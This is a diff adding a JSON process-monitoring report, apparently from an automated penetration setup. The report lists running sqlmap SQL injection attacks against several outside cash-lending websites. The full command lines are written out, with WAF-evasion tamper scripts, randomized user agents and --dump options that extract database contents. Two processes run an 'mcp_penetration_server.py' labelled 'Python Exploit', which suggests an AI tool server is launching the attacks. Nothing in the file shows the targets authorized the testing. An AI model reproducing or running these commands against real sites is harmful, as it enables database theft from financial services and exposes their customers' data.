@@ -1,0 +1,118 @@
+{
+  "report_time": "2025-10-29T14:17:52.756990",
+  "monitoring_status": "Active",
+  "statistics": {
+    "active_attacks": 0,
+    "total_alerts": 0,
+    "total_processes": 15
+  },
+  "recent_successes": [],
+  "vulnerability_alerts": [],
+  "monitored_processes": [
+    {
+      "pid": 38536,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://rocket-cash.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=local_awvs_sqlmap_20251029_141552",
+      "target": "https://rocket-cash.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 44036,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=auto_local_sqlmap_20251029_141415",
+      "target": "https://ngoenmun.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 44844,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=local_awvs_sqlmap_20251029_140552",
+      "target": "https://quickcash.in.th/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 51968,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://mula-x.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=local_awvs_sqlmap_20251029_140552",
+      "target": "https://mula-x.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 52188,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=auto_local_sqlmap_20251029_140154",
+      "target": "https://quickcash.in.th/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 54656,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u http://127.0.0.1:5000/user?id=1 -p id --batch --level=1 --risk=1 --fresh-queries --banner --current-db --tables --dump -D testdb -T users -C id,username,password --limit=3",
+      "target": "http://127.0.0.1:5000/user?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 55628,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -r th1.txt --batch --dbs --crawl 2 --tamper=space2comment --random-agent --level 3 --risk 3",
+      "target": "Unknown",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 59504,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://mula-x.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=auto_local_sqlmap_20251029_141415",
+      "target": "https://mula-x.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 62908,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://mula-x.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=local_awvs_sqlmap_20251029_141202",
+      "target": "https://mula-x.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 64912,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=auto_local_sqlmap_20251029_135548",
+      "target": "https://quickcash.in.th/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 75124,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://mula-x.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=auto_local_sqlmap_20251029_140804",
+      "target": "https://mula-x.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 78492,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=local_awvs_sqlmap_20251029_135946",
+      "target": "https://quickcash.in.th/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 81880,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/application.php?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=2 --time-sec=30 --threads=3 --dump --output-dir=local_awvs_sqlmap_20251029_141202",
+      "target": "https://ngoenmun.com/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 27232,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    },
+    {
+      "pid": 30964,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    }
+  ]
+}
